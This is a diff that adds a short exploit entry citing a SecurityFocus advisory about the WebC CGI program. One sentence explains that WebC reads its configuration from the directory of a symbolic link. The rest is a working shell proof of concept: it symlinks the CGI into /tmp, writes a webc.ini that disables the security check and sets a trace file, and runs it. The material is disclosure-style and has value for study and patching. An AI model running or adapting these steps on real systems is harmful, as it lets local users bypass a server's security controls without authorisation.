@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/7272/info
+
+It has been reported that WebC will execute in the directory of a symbolic link from which it is invoked. Because of this, it may be possible for a local user to load a configuration file that enabled dangerous variables. 
+
+$ cd /tmp
+$ ln -s /usr/local/apache/cgi-bin/webc.cgi webc.cgi
+$ cp /usr/local/apache/cgi-bin/webc.emf .
+$ echo "WEBC_NO_SECURITY_CHECK=True" > webc.ini
+$ echo "HTML_TRACE_REQUEST=/tmp/.debug1" >> webc.ini
+$ ./webc.cgi 
